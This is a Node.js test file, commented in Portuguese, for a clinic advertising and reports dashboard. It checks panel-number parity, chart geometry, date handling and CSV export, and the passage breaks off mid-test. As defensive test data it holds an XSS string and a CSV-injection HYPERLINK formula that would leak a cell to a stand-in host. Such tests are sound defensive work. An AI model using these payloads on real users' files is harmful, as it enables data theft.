/* ============================================================
   ÓRBITA — testes da frente F6 (Anúncios, Início, Relatórios)
   node testes/relatorios.teste.mjs      (Node puro, sem dependências)
   (a) IGUALDADE: o módulo Anúncios (rel-logica sobre nucleo.js) dá os
       MESMOS números do painel clássico — a conta do painel é extraída
       do próprio web/painel.js e rodada aqui, lado a lado
   (b) graficos.js: escalas, eixos, caminhos SVG, arcos, calor
   (c) variação %, divisão por zero, datas no fuso de SP
   (d) lógica dos relatórios e do início (rel-logica)
   (e) checagem estática dos arquivos da F6
   ============================================================ */
import assert from "node:assert/strict";
import { readFileSync, existsSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const AQUI = dirname(fileURLToPath(import.meta.url));
const RAIZ = join(AQUI, "..");
const WEB = join(RAIZ, "web");
const ler = f => readFileSync(join(RAIZ, f), "utf8");

let ok = 0, falhas = 0;
async function teste(nome, fn) {
  try { await fn(); ok++; console.log(`  ✓ ${nome}`); }
  catch (e) { falhas++; console.log(`  ✗ ${nome}\n      ${String(e && e.stack || e).split("\n").slice(0, 6).join("\n      ")}`); }
}

const N = await import("../web/nucleo.js");
const { gerarDemo } = await import("../web/demo.js");
const L = await import("../web/app/rel-logica.js");
const G = await import("../web/app/graficos.js");

const HOJE = "2026-09-27";
const dsDemo = gerarDemo({ nome: "Clínica Demonstração", hoje: HOJE });
const MD = N.montar(dsDemo);

/* ---------- a conta do painel clássico, tirada do próprio painel.js ---------- */
const PAINEL = readFileSync(join(WEB, "painel.js"), "utf8");
function trecho(inicio, fimRegex) {
  const i = PAINEL.indexOf(inicio);
  assert.ok(i >= 0, `painel.js mudou: não achei "${inicio}"`);
  const resto = PAINEL.slice(i);
  const m = fimRegex.exec(resto);
  assert.ok(m, `painel.js mudou: fim de "${inicio}"`);
  return resto.slice(0, m.index + m[0].length);
}
const SRC_PERIODO = [
  trecho("const janela = () =>", /;\n/),
  trecho("const campanhas = () =>", /;\n/),
  trecho("function numerosPeriodo() {", /\n}\n/),
  trecho("function linhasCamp() {", /\n}\n/),
].join("\n");
/** Roda numerosPeriodo()/linhasCamp() do painel com o M e o S dados. */
const painel = new Function("M", "S", `${SRC_PERIODO}\nreturn { numerosPeriodo, linhasCamp };`);
const PURO = PAINEL.slice(PAINEL.indexOf("/* ==== PURO: início"), PAINEL.indexOf("/* ==== PURO: fim ==== */"));
const puroPainel = new Function("horaSP", "quandoSP", "hojeSP", "meioDia", "isoDe",
  `${PURO}\nreturn { statusEnvio, estadoIntegracao, canalDe, nomeRegraSrv, eixoTopo };`)(L.horaSP, L.quandoSP, N.hojeSP, N.meioDia, N.isoDe);
const TRACO = new Function(`${trecho("function traco(p) {", /\n}\n/)}\nreturn traco;`)();

/** A demo convertida para o formato de nx_dados (o caminho REAL do módulo Anúncios). */
function demoParaLinhas(ds, M) {
  const iso = i => N.isoDe(M.dataDe(i));
  const metricas = ds.LINHAS.map(l => ({
    p: l.plat, d: iso(l.i), n: "anuncio", c: l.camp, cn: ds.CAMP[l.camp].nome, a: l.cri, an: ds.CRI[l.cri].nome,
    imp: l.impressoes, alc: l.alcance, freq: l.freq || 0, cli: l.cliques, g: l.gasto, conv: l.conversoes,
  }));
  const leads = ds.LEADS.filter(Lx => Lx.i <= M.R).map(Lx => ({
    id: Lx.id, nome: Lx.nome, telefone: "", origem: "anuncio", plataforma: Lx.plat, campanha_ext: Lx.camp, anuncio_ext: Lx.cri,
    servico: Lx.servico, etapa: M.etapa(Lx), data_conversa: iso(Lx.i),
    data_agenda: Lx.iAgenda != null ? iso(Lx.iAgenda) : null, data_consulta: Lx.iConsulta != null ? iso(Lx.iConsulta) : null,
    valor: Lx.fechou ? M.valorLead(Lx) : null, obs: "",
  }));
  return { metricas, leads };
}
/** Exatamente o que anuncios.js faz com a resposta de nx_dados. */
const mDeDados = dados => N.montar(N.datasetDeLinhas({ metricas: dados.metricas || [], leads: dados.leads || [],
  cliente: dados.cliente || { nome: "X", cfg: {} }, hoje: dados.hoje, dias: 130 }));

/* ============================================================
   (a) IGUALDADE COM O PAINEL CLÁSSICO
   ============================================================ */
console.log("\n(a) Anúncios = painel clássico");

await teste("demo, 30 dias: 106 conversas, 44 agendadas, 13 fechados, R$ 13.550 e 'Cada R$ 1 virou R$ 5,41'", () => {
  const P = L.numerosPeriodo(MD, { dias: 30 });
  assert.deepEqual([P.c.conversas, P.c.agendadas, P.c.fecharam, P.c.receita], [106, 44, 13, 13550]);
  assert.equal(P.c.compareceram, 29);
  assert.equal(N.brl(P.retorno).replace(/\s/g, " "), "R$ 5,41");
});

const { metricas, leads } = demoParaLinhas(dsDemo, MD);
const dadosFalsos = { hoje: HOJE, cliente: { id: "c1", slug: "demo", nome: "Clínica Demonstração", cfg: {} }, metricas, leads, alertas: [], relatorios: [], integracoes: [] };
const MR = mDeDados(dadosFalsos);

await teste("caminho real (nx_dados → datasetDeLinhas 130 dias) = painel clássico em 7/30/60 dias × Tudo/Meta/Google", () => {
  const { numerosPeriodo } = painel(MR, { dias: 30, plat: "" });
  for (const dias of [7, 30, 60]) for (const plat of ["", "meta", "google"]) {
    const a = painel(MR, { dias, plat }).numerosPeriodo(), b = L.numerosPeriodo(MR, { dias, plat });
    const pega = P => [P.de, P.ate, P.deA, P.ateA, P.t.gasto, P.t.conversoes, P.t.cpa, P.ta.gasto, P.c.conversas, P.c.agendadas,
      P.c.compareceram, P.c.fecharam, P.c.receita, P.ca.conversas, P.ca.fecharam, P.ca.receita, P.roas, P.fee, P.custoTotal, P.retorno];
    assert.deepEqual(pega(b), pega(a), `${dias} dias, plat '${plat}'`);
  }
  assert.equal(typeof numerosPeriodo, "function");
});

await teste("caminho real = demo (os números da reunião são os do banco)", () => {
  for (const dias of [7, 30, 60]) {
    const a = L.numerosPeriodo(MD, { dias }), b = L.numerosPeriodo(MR, { dias });
    assert.deepEqual([b.c.conversas, b.c.agendadas, b.c.compareceram, b.c.fecharam, b.c.receita], [a.c.conversas, a.c.agendadas, a.c.compareceram, a.c.fecharam, a.c.receita]);
    assert.ok(Math.abs(a.t.gasto - b.t.gasto) < 1e-6);
  }
});

await teste("campanhas: mesmas linhas do painel (linhasCamp) e totais do rodapé", () => {
  for (const dias of [7, 30, 60]) for (const plat of ["", "meta", "google"]) {
    const a = painel(MR, { dias, plat }).linhasCamp(), { linhas: b, total } = L.linhasCampanhas(MR, { dias, plat });
    const pega = r => [r.c.id, r.t.gasto, r.t.conversoes, r.t.cpa, r.k.agendadas, r.k.fecharam, r.k.receita, r.roas, r.cpp, r.cpag];
    assert.deepEqual(b.map(pega), a.map(pega), `${dias} dias, '${plat}'`);
    assert.equal(total.fe, a.reduce((s, r) => s + r.k.fecharam, 0));
    assert.equal(total.rec, a.reduce((s, r) => s + r.k.receita, 0));
  }
  const { linhas } = L.linhasCampanhas(MR, { dias: 30 });
  const ord = L.ordenarCampanhas(linhas, "rec", -1);
  for (let i = 1; i < ord.length; i++) assert.ok(ord[i - 1].k.receita >= ord[i].k.receita);
  const porNome = L.ordenarCampanhas(linhas, "nome", 1).map(r => r.c.nome);
  assert.deepEqual(porNome, porNome.slice().sort((x, y) => x.localeCompare(y, "pt-BR")));
});

await teste("negócio de pós-venda (funil fora do Ads) não muda nada: nx_dados já não o devolve", () => {
  // o filtro de funil é do servidor (§4.11); aqui garantimos que um lead SEM anúncio também não conta
  const extra = { ...dadosFalsos, leads: [...leads, { id: 9e6, nome: "Pós", telefone: "", origem: "manual", plataforma: null, campanha_ext: null,
    anuncio_ext: null, servico: "Implante", etapa: "fechou", data_conversa: "2026-09-20", data_agenda: "2026-09-21", data_consulta: "2026-09-22", valor: 9000, obs: "" }] };
  const a = L.numerosPeriodo(MR, { dias: 30 }), b = L.numerosPeriodo(mDeDados(extra), { dias: 30 });
  assert.deepEqual([b.c.conversas, b.c.fecharam, b.c.receita], [a.c.conversas, a.c.fecharam, a.c.receita]);
});

await teste("série diária do gráfico = porDia do núcleo (gasto Meta+Google, conversas, média de 7 dias)", () => {
  const { atual, anterior } = L.serieDiaria(MR, { dias: 30 });
  assert.equal(atual.length, 30); assert.equal(anterior.length, 30);
  const sd = MR.porDia("");
  const soma = atual.reduce((s, d) => s + d.gasto, 0), t = MR.consolidar(MR.linhasDe(MR.R - 29, MR.R));
  assert.ok(Math.abs(soma - t.gasto) < 1e-6);
  assert.equal(atual[29].i, MR.R);
  assert.equal(atual[29].convMedia, MR.media7(sd.conv, MR.R));
  const so = L.serieDiaria(MR, { dias: 7, plat: "meta" }).atual;
  assert.ok(so.every(d => d.google === 0));
});

await teste("criativos da campanha: situação do radar agora (fadiga r4 e CTR r3 no criativo cansado)", () => {
  const camp = Object.values(MR.CAMP).find(c => c.plat && c.nome.startsWith("Prova social"));
  const cri = L.criativosDaCampanha(MR, camp.id, { dias: 30 });
  const cansado = cri.find(x => x.k.nome.startsWith("Print das avaliações"));
  assert.ok(cansado && cansado.fadiga && cansado.ctrBaixo, "o criativo cansado aparece com os dois avisos");
  assert.ok(cri.every((x, i) => i === 0 || cri[i - 1].t.gasto >= x.t.gasto), "ordenados por gasto");
});

await teste("radar: episódios do núcleo + registro do servidor com ✓/✓✓/! (mesma régua do painel)", () => {
  const alertas = [
    { regra: "r1", chave: MR.avaliar(MR.R, true).find(a => a.regra.id === "r1").chave, severidade: "alerta", mensagem: "x", acao: "y", referencia: "2026-09-26",
      criado_em: "2026-09-27T10:00:00Z", enviado_em: "2026-09-27T10:00:03Z", entregue_em: "2026-09-27T10:00:09Z" },
    { regra: "integracao", chave: "integracao|meta", severidade: "critico", mensagem: "A conexão com o Meta parou", acao: "z", referencia: "2026-09-26",
      criado_em: "2026-09-27T09:00:00Z", enviado_em: null, entregue_em: null, erro: "WhatsApp não entregou (código 131047)" },
  ];
  const integracoes = [{ canal: "meta", ativo: true, ultimo_sync: "2026-09-27T08:00:00Z", status: "erro — token expirado" }, { canal: "google", ativo: true, ultimo_sync: "2026-09-27T11:50:00Z", status: "ok — 3 linhas" }];
  const agora = Date.parse("2026-09-27T12:00:00Z");
  const R = L.montarRadar(MR, { alertas, integracoes }, agora);
  assert.equal(R.atuais.length, MR.avaliar(MR.R, true).length);
  assert.equal(R.ativos, R.atuais.length + 1, "conexão caída conta como alerta ativo");
  assert.equal(R.conexoes.length, 1); assert.equal(R.conexoes[0].canal, "meta"); assert.ok(R.conexoes[0].ativo);
  const r1 = R.episodios.find(e => e.regra === "r1");
  assert.equal(r1.envio.k, "entregue"); assert.equal(r1.envio.tique, "✓✓");
  assert.equal(R.registro[1].envio.k, "erro"); assert.equal(R.registro[1].envio.tique, "!");
  assert.deepEqual(L.estadoIntegracao(integracoes, alertas, agora), puroPainel.estadoIntegracao(integracoes, alertas, agora));
  assert.equal(L.textoPilula(L.estadoIntegracao(integracoes, alertas, agora)), "Meta desconectado");
  assert.equal(L.textoQueda(L.estadoIntegracao(integracoes, alertas, agora).erros), "Meta desconectado · dados até 27/09 05:00.");
});

await teste("statusEnvio, canalDe, nomeRegraSrv e eixoTopo = os do painel", () => {
  const casos = [null, {}, { enviado_em: "2026-09-27T11:03:00Z" }, { enviado_em: "2026-09-27T11:03:00Z", entregue_em: "2026-09-27T11:04:00Z" },
    { erro: "sem token" }, { enviado_em: "2026-09-27T11:03:00Z", erro: "WhatsApp não entregou (código 131047)" }];
  for (const x of casos) {
    const a = puroPainel.statusEnvio(x), b = L.statusEnvio(x);
    if (a == null) { assert.equal(b, null); continue; }
    assert.deepEqual([b.k, b.tique, b.rotulo, b.erro], [a.k, a.tique, a.rotulo, a.erro]);
  }
  assert.equal(L.statusEnvio({ entregue_em: "2026-09-27T11:04:00Z" }).rotulo, "entregue às 08:04", "hora no fuso de SP");
  for (const a of [{ chave: "integracao|google" }, { mensagem: "Conexão com o Meta" }, { chave: "r1|x" }])
    assert.equal(L.canalDe(a), puroPainel.canalDe(a));
  assert.equal(L.nomeRegraSrv({ regra: "integracao", chave: "integracao|meta" }), "Conexão com Meta");
  assert.equal(L.nomeRegraSrv({ regra: "r9" }, MR.REGRAS), "Aviso do radar");
  for (const v of [0, 1, 7.3, 13, 55, 99, 101, 250, 999, 1234, 5000, 12345, 87000]) assert.equal(L.eixoTopo(v), puroPainel.eixoTopo(v), `eixoTopo(${v})`);
});

await teste("relatórios enviados: ordem por referência (mensal antes do diário do mesmo dia) e títulos", () => {
  const rel = [
    { tipo: "diario", referencia: "2026-09-25", texto: "a", enviado_em: "2026-09-26T11:00:03Z", entregue_em: null },
    { tipo: "mensal", referencia: "2026-09-01", texto: "b", enviado_em: "2026-10-01T12:00:00Z", entregue_em: "2026-10-01T12:00:30Z", leitura_ia: "x" },
    { tipo: "diario", referencia: "2026-09-26", texto: "c", enviado_em: null, erro: "sem destino" },
    { tipo: "diario", referencia: "2026-09-01", texto: "d", enviado_em: "2026-09-02T11:00:00Z" },
  ];
  const l = L.listaRelatorios(rel);
  assert.deepEqual(l.map(x => x.chave), ["diario|2026-09-26", "diario|2026-09-25", "mensal|2026-09-01", "diario|2026-09-01"]);
  assert.equal(l[2].titulo, "Resumo de setembro de 2026"); assert.ok(l[2].ia);
  assert.equal(l[0].titulo, "Diário de 26/09/2026"); assert.equal(l[0].envio.k, "erro");
  assert.deepEqual(L.listaRelatorios([null, {}, { tipo: "mensal", referencia: "não é data" }, { tipo: "outro", referencia: "2026-09-01" }]), [],
    "respostas incompletas não viram 'undefined' no painel e não quebram a lista");
  assert.deepEqual(L.listaRelatorios([{ tipo: "diario", referencia: "2026-02-31", texto: "inválida" }]), [], "datas impossíveis não viram títulos incorretos");
  assert.doesNotThrow(() => L.listaRelatorios({ erro: "resposta inesperada" }), "formato de RPC inesperado não quebra a tela");
});

await teste("texto do WhatsApp vira tokens (nunca HTML): *negrito*, _itálico_, quebra e '<script>' como texto", () => {
  assert.deepEqual(L.tokensWa("📊 *Clínica · Tráfego* — hoje\n• _nota_ <b>"), [
    { t: "txt", v: "📊 " }, { t: "b", v: "Clínica · Tráfego" }, { t: "txt", v: " — hoje" }, { t: "br" },
    { t: "txt", v: "• " }, { t: "i", v: "nota" }, { t: "txt", v: " <b>" }]);
  assert.deepEqual(L.tokensWa("<script>alert(1)</script>"), [{ t: "txt", v: "<script>alert(1)</script>" }]);
  assert.deepEqual(L.tokensWa("a_b_c"), [{ t: "txt", v: "a_b_c" }], "sublinhado no meio da palavra não vira itálico");
  const rel = MR.relDiario(MR.R), tk = L.tokensWa(rel);
  assert.equal(tk.filter(x => x.t !== "br").map(x => x.v).join(""), rel.replace(/\n/g, "").replace(/\*([^*\n]+)\*/g, "$1").replace(/(^|[\s(])_([^_\n]+)_/g, "$1$2"));
});

await teste("cliente sem anúncios: nada quebra e nada é inventado", () => {
  const M0 = mDeDados({ hoje: HOJE, cliente: { nome: "Nova", cfg: {} }, metricas: [], leads: [] });
  assert.ok(L.semAnuncios(M0));
  const P = L.numerosPeriodo(M0, { dias: 30 });
  assert.equal(P.c.conversas + P.c.fecharam + P.c.receita + P.t.gasto, 0);
  assert.equal(P.retorno, 0, "sem gasto mas com gestão: 0 ÷ gestão = 0 (igual ao painel)");
  assert.equal(L.linhasCampanhas(M0).linhas.length, 0);
  const R = L.montarRadar(M0, {});
  assert.deepEqual([R.ativos, R.episodios.length, R.registro.length], [0, 0, 0]);
  assert.equal(L.estadoIntegracao([], []).nivel, "nenhuma");
});

await teste("interface de Ads explica a origem do retorno e distingue relatórios enviados de prévias", () => {
  const src = ler("web/app/anuncios.js");
  assert.match(src, /"Retorno total"/);
  assert.match(src, /receita ÷ \(anúncios \+ gestão\)/);
  assert.match(src, /valor informado nos negócios ganhos do CRM/);
  assert.match(src, /"Relatórios e prévias"/);
  assert.match(src, /ainda não enviado · prévia/);
});

/* ============================================================
   (b) GRÁFICOS
   ============================================================ */
console.log("\n(b) graficos.js — geometria");

await teste("escala linear, inversa e domínio degenerado", () => {
  const y = G.escala([0, 100], [280, 14]);
  assert.equal(y(0), 280); assert.equal(y(100), 14); assert.equal(y(50), 147);
  assert.equal(y.inverter(147), 50);
  const z = G.escala([5, 5], [0, 10]);
  assert.equal(z(5), 0); assert.equal(z.inverter(3), 5);
});

await teste("topo e marcas do eixo: degraus inteiros, sempre ≥ máximo, igual ao painel", () => {
  for (const v of [1, 3, 9.9, 17, 55, 144, 999, 1500, 13550]) {
    const t = G.ticks(v);
    assert.equal(t.length, 5); assert.equal(t[0], 0); assert.ok(t[4] >= v, `topo ${t[4]} ≥ ${v}`);
    assert.ok(t.every(x => Number.isInteger(x) || v < 4), `marcas inteiras para ${v}: ${t}`);
    assert.ok(Math.abs(G.topoBonito(v) - puroPainel.eixoTopo(v)) < 1e-9, `topo(${v}) = painel`);
  }
  assert.equal(G.topoBonito(0), 4); assert.equal(G.topoBonito(-3), 4);
  assert.deepEqual(G.ticks(0), [0, 1, 2, 3, 4]);
});

await teste("caminhos: reto, suave (= traco do painel) e área fechada", () => {
  const p = [[0, 10], [10, 0], [20, 5], [30, 5]];
  assert.equal(G.caminhoReto(p), "M0 10 L10 0 L20 5 L30 5");
  assert.equal(G.caminhoSuave(p).replace(/\.0\b/g, ""), TRACO(p).replace(/\.0\b/g, ""));
  assert.match(G.caminhoArea(p, 50), /^M0 10 C.* L30 50 L0 50 Z$/);
  assert.equal(G.caminhoReto([]), ""); assert.equal(G.caminhoSuave([]), ""); assert.equal(G.caminhoArea([], 9), "");
  assert.equal(G.caminhoSuave([[1, 2]]), "M1 2");
});

await teste("rosca: fatias somam 360°, zeros ficam de fora, 100% vira dois arcos", () => {
  const f = G.fatiasDe([3, 0, 1]);
  assert.equal(f.length, 2); assert.equal(f[0].i, 0); assert.equal(f[1].i, 2);
  assert.ok(Math.abs(f[1].a1 - Math.PI * 2) < 1e-9); assert.equal(f[0].pct, 75);
  assert.deepEqual(G.fatiasDe([0, 0]), []);
  const [x, y] = G.polar(100, 100, 50, 0); assert.ok(Math.abs(x - 100) < 1e-9 && Math.abs(y - 50) < 1e-9, "0 rad = topo");
  const [x2, y2] = G.polar(100, 100, 50, Math.PI / 2); assert.ok(Math.abs(x2 - 150) < 1e-9 && Math.abs(y2 - 100) < 1e-9, "horário");
  const d = G.arcoAnel(100, 100, 90, 60, 0, Math.PI / 2);
  assert.match(d, /^M100 10 A90 90 0 0 1 190 100 L160 100 A60 60 0 0 0 100 40 Z$/);
  assert.match(G.arcoAnel(100, 100, 90, 60, 0, Math.PI * 1.5), / A90 90 0 1 1 /, "arco grande > 180°");
  assert.equal((G.arcoAnel(100, 100, 90, 60, 0, Math.PI * 2).match(/Z/g) || []).length, 2);
});

await teste("mapa de calor, rótulos do eixo e barras agrupadas", () => {
  assert.equal(G.nivelCalor(0, 10), 0); assert.equal(G.nivelCalor(10, 10), 5); assert.equal(G.nivelCalor(.1, 10), 1);
  assert.equal(G.nivelCalor(5, 0), 0); assert.equal(G.nivelCalor(3, 10, 5), 2);
  assert.equal(G.passoRotulo(30, 7), 5); assert.equal(G.passoRotulo(5, 7), 1); assert.equal(G.passoRotulo(90, 0), 90);
  const a = G.posBarra({ g: 0, s: 0, grupos: 2, series: 2, x0: 0, largura: 200 }), b = G.posBarra({ g: 0, s: 1, grupos: 2, series: 2, x0: 0, largura: 200 });
  assert.ok(b.x > a.x && a.x >= 0 && b.x + b.w <= 100, "duas barras cabem no 1º grupo");
});

/* ============================================================
   (c) VARIAÇÃO E DATAS
   ============================================================ */
console.log("\n(c) variação e datas");

await teste("variação %: normal, queda, divisão por zero e sem base", () => {
  assert.equal(L.variacao(12, 10), 20); assert.equal(L.variacao(5, 10), -50);
  assert.equal(L.variacao(0, 0), 0, "0 → 0 é 0%");
  assert.equal(L.variacao(5, 0), null, "de 0 para 5 não tem % (sem base)");
  assert.equal(L.variacao(null, 3), null); assert.equal(L.variacao(3, undefined), null); assert.equal(L.variacao(NaN, 3), null);
  for (const [a, b] of [[12, 10], [0, 0], [5, 0], [1, 3]]) assert.equal(L.variacao(a, b), N.variacao(a, b), "mesma regra do núcleo");
});

await teste("chip de variação: sentido 'cima', 'baixo' e neutro", () => {
  assert.deepEqual(pick(L.chipVar(12, 10, "cima")), { cls: "bom", seta: "▲", txt: "20%" });
  assert.deepEqual(pick(L.chipVar(8, 10, "cima")), { cls: "ruim", seta: "▼", txt: "20%" });
  assert.deepEqual(pick(L.chipVar(8, 10, "baixo")), { cls: "bom", seta: "▼", txt: "20%" });
  assert.deepEqual(pick(L.chipVar(12, 10, "neutro")), { cls: "neutro", seta: "▲", txt: "20%" });
  assert.deepEqual(pick(L.chipVar(5, 0)), { cls: "neutro", seta: "", txt: "sem base" });
  assert.deepEqual(pick(L.chipVar(100.4, 100)), { cls: "neutro", seta: "→", txt: "0%" });
  function pick(c) { return { cls: c.cls, seta: c.seta, txt: c.txt }; }
});

await teste("datas no fuso de São Paulo (servidor em UTC não muda o dia)", () => {
  assert.equal(L.hojeSP(new Date("2026-09-28T02:30:00Z")), "2026-09-27", "23:30 em SP ainda é dia 27");
  assert.equal(L.horaSP("2026-09-28T02:30:00Z"), "23:30");
  assert.equal(L.quandoSP("2026-09-28T02:30:00Z", new Date("2026-09-28T12:00:00Z")), "ontem às 23:30");
  assert.equal(L.somarDias("2026-02-27", 2), "2026-03-01"); assert.equal(L.difDias("2026-01-01", "2027-01-01"), 365);
  assert.equal(L.dataIsoBR("2026-09-05"), "05/09/2026");
});

/* ============================================================
   (d) RELATÓRIOS E INÍCIO (rel-logica, parte 4 e 5)
   ============================================================ */
console.log("\n(d) relatórios e início");

await teste("período: 7/30/90 terminam hoje (SP); personalizado confere ordem e o limite de 1 ano (periodo_grande)", () => {
  assert.deepEqual(L.periodoPreset(30, "2026-09-28"), { de: "2026-08-30", ate: "2026-09-28" }, "30 dias = hoje e os 29 anteriores");
  assert.deepEqual(L.periodoPreset(7, "2026-03-02"), { de: "2026-02-24", ate: "2026-03-02" });
  assert.equal(L.difDias(L.periodoPreset(90, "2026-09-28").de, "2026-09-28") + 1, 90);
  assert.deepEqual(L.validarPeriodo("2026-01-01", "2026-01-31"), { ok: true, dias: 31 });
  assert.equal(L.validarPeriodo("2026-01-01", "2026-01-01").dias, 1, "um dia só vale");
  assert.equal(L.validarPeriodo("2025-09-28", "2026-09-29").ok, true, "366 dias de diferença ainda vale (p_ate − p_de ≤ 366)");
  const g = L.validarPeriodo("2025-09-28", "2026-09-30");
  assert.equal(g.ok, false); assert.equal(g.erro, "periodo_grande", "mesmo código do servidor (Apêndice B)");
  const inv = L.validarPeriodo("2026-02-10", "2026-02-01");
  assert.equal(inv.ok, false); assert.equal(inv.erro, "dados_invalidos");
  assert.equal(L.validarPeriodo("", "2026-02-01").ok, false); assert.equal(L.validarPeriodo("10/02/2026", "2026-02-11").ok, false);
});

await teste("durações: minutos, horas e dias sem '1 h 60 min' e sem valor inventado", () => {
  const casos = [[null, "—"], [undefined, "—"], [NaN, "—"], [0, "< 1 min"], [0.4, "< 1 min"], [12, "12 min"], [59.4, "59 min"],
    [59.6, "1 h"], [65, "1 h 05 min"], [119.7, "2 h"], [120, "2 h"], [9 * 60 + 59, "9 h 59 min"], [26 * 60, "26 h"],
    [2 * 1440, "2 dias"], [3.5 * 1440, "3,5 dias"], [-5, "< 1 min"]];
  for (const [v, esp] of casos) assert.equal(L.duracaoMin(v), esp, `duracaoMin(${v})`);
  assert.equal(L.duracaoH(1.5), "1 h 30 min"); assert.equal(L.duracaoH(null), "—"); assert.equal(L.duracaoH(72), "3 dias");
});

const REL_V = {
  periodo: { de: "2026-08-30", ate: "2026-09-28" }, anterior: { de: "2026-07-31", ate: "2026-08-29" },
  kpis: { criados: 40, ganhos: 12, receita: 18000, perdidos: 8, valor_perdido: 9000, abertos: 20, valor_aberto: 30000, previsao_ponderada: 12500, ticket_medio: 1500, conversao_pct: 60, ciclo_medio_dias: 6.5 },
  kpis_anterior: { criados: 32, ganhos: 10, receita: 20000, perdidos: 10, valor_perdido: 1, abertos: 1, valor_aberto: 1, previsao_ponderada: 1, ticket_medio: 2000, conversao_pct: 50, ciclo_medio_dias: 8 },
};
await teste("KPIs de vendas: 6 blocos na ordem, com o valor do período anterior e o sentido certo", () => {
  const k = L.kpisVendas(REL_V);
  assert.deepEqual(k.map(x => x.id), ["criados", "ganhos", "receita", "conversao_pct", "ticket_medio", "ciclo_medio_dias"]);
  assert.deepEqual(k.map(x => [x.v, x.a]), [[40, 32], [12, 10], [18000, 20000], [60, 50], [1500, 2000], [6.5, 8]]);
  const ciclo = k.find(x => x.id === "ciclo_medio_dias");
  assert.equal(ciclo.sentido, "baixo", "ciclo menor é melhor");
  assert.equal(L.chipVar(ciclo.v, ciclo.a, ciclo.sentido).cls, "bom");
  const rec = k.find(x => x.id === "receita");
  assert.equal(L.chipVar(rec.v, rec.a, rec.sentido).cls, "ruim", "receita caiu 10%");
  assert.equal(L.kpisVendas(null).length, 6, "sem resposta não quebra");
  assert.ok(L.kpisVendas(null).every(x => x.v === undefined));
});

await teste("KPIs de atendimento: 1ª resposta e resolução com 'menos é melhor'; abertas agora sem comparação", () => {
  const r = { kpis: { novas: 50, resolvidas: 40, abertas_agora: 7, aguardando_agora: 3, tpr_mediana_min: 4.2, tpr_media_min: 11, resolucao_mediana_h: 5, msgs_in: 300, msgs_out: 280, sem_resposta: 2 },
              kpis_anterior: { novas: 40, resolvidas: 30, tpr_mediana_min: 6, resolucao_mediana_h: 4, sem_resposta: 4 } };
  const k = L.kpisAtendimento(r);
  assert.deepEqual(k.map(x => x.id), ["novas", "resolvidas", "tpr_mediana_min", "resolucao_mediana_h", "abertas_agora", "sem_resposta"]);
  const tpr = k.find(x => x.id === "tpr_mediana_min");
  assert.equal(tpr.fmt, "min"); assert.equal(L.chipVar(tpr.v, tpr.a, tpr.sentido).cls, "bom", "de 6 para 4,2 min melhorou");
  assert.match(tpr.extra, /média 11 min/);
  const res = k.find(x => x.id === "resolucao_mediana_h");
  assert.equal(L.chipVar(res.v, res.a, res.sentido).cls, "ruim", "de 4 h para 5 h piorou");
  assert.equal(k.find(x => x.id === "abertas_agora").a, null, "foto de agora não compara");
  assert.match(k.find(x => x.id === "abertas_agora").extra, /3 aguardando/);
  assert.match(k.find(x => x.id === "novas").extra, /300 mensagens recebidas/);
});

await teste("mapa de calor: lista → matriz 7 × 24 (0 = domingo), pico e entradas inválidas ignoradas", () => {
  const m = L.matrizCalor([{ dow: 1, hora: 9, qtd: 5 }, { dow: 1, hora: 9, qtd: 2 }, { dow: 6, hora: 23, qtd: 3 }, { dow: 7, hora: 1, qtd: 99 }, { dow: 0, hora: 24, qtd: 99 }, { dow: "3", hora: "14", qtd: "4" }]);
  assert.equal(m.length, 7); assert.ok(m.every(l => l.length === 24));
  assert.equal(m[1][9], 7, "soma repetidos"); assert.equal(m[6][23], 3); assert.equal(m[3][14], 4, "aceita texto numérico");
  assert.equal(m.flat().reduce((s, x) => s + x, 0), 14, "dow 7 e hora 24 ficam de fora");
  assert.deepEqual(L.picoCalor(m), { dow: 1, hora: 9, qtd: 7 });
  assert.equal(L.picoCalor(L.matrizCalor([])), null);
  assert.equal(L.matrizCalor(null).flat().length, 168);
});

await teste("vazios: 'Sem dados no período.' só quando nada aconteceu (carteira aberta conta)", () => {
  assert.equal(L.vendasVazio(null), true);
  assert.equal(L.vendasVazio({ kpis: { criados: 0, ganhos: 0, perdidos: 0, abertos: 0 } }), true);
  assert.equal(L.vendasVazio({ kpis: { criados: 0, ganhos: 0, perdidos: 0, abertos: 3 } }), false, "negócios abertos de antes ainda aparecem");
  assert.equal(L.vendasVazio(REL_V), false);
  assert.equal(L.atendimentoVazio({ kpis: { novas: 0, resolvidas: 0, msgs_in: 0, abertas_agora: 0 } }), true);
  assert.equal(L.atendimentoVazio({ kpis: { novas: 0, resolvidas: 0, msgs_in: 2, abertas_agora: 0 } }), false);
});

await teste("funil: texto da conversão só em etapa aberta; origem com plataforma", () => {
  assert.equal(L.textoConversao({ tipo: "aberto", passaram: 10, conversao_proxima_pct: 42.5 }), "10 entraram · 42,5% seguiram");
  assert.equal(L.textoConversao({ tipo: "aberto", passaram: 1, conversao_proxima_pct: 100 }), "1 entrou · 100% seguiram");
  assert.equal(L.textoConversao({ tipo: "aberto", passaram: 0 }), "ninguém entrou no período");
  assert.equal(L.textoConversao({ tipo: "ganho", passaram: 3 }), null);
  assert.equal(L.textoConversao({ tipo: "aberto", passaram: 2, conversao_proxima_pct: null }), "2 entraram · — seguiram");
  assert.equal(L.nomeOrigem("anuncio", "meta"), "Anúncio · Meta"); assert.equal(L.nomeOrigem("whatsapp", null), "WhatsApp");
  assert.equal(L.nomeOrigem(null, null), "Sem origem"); assert.equal(L.nomeOrigem("feira", null), "feira", "origem desconhecida aparece como veio");
  assert.equal(L.ddmmIso("2026-09-05"), "05/09"); assert.equal(L.diaLongoIso("2026-09-27"), "dom · 27/09");
});

await teste("CSV: BOM para o Excel, ; como separador, aspas e quebras escapadas", () => {
  const s = L.csv(["Nome", "Valor"], [["Ana; Silva", 10], ['Diz "oi"', null], ["linha\nquebrada", 3.5]]);
  assert.ok(s.startsWith("﻿"), "BOM");
  const linhas = s.slice(1).split("\r\n");
  assert.equal(linhas[0], "Nome;Valor");
  assert.equal(linhas[1], '"Ana; Silva";10');
  assert.equal(linhas[2], '"Diz ""oi""";');
  assert.equal(s.includes('"linha\nquebrada";3,5'), true, "número com vírgula decimal (Excel em português)");
});

await teste("CSV: texto do usuário nunca vira fórmula no Excel (injeção de CSV); número negativo continua número", () => {
  assert.equal(L.csv(["x"], []).charCodeAt(0), 0xFEFF, "BOM de verdade (U+FEFF)");
  const s = L.csv(["Atendente", "Conversas", "1ª resposta"], [
    ['=HYPERLINK("http://mal.example/?"&A1;"clique")', 3, 12.5],
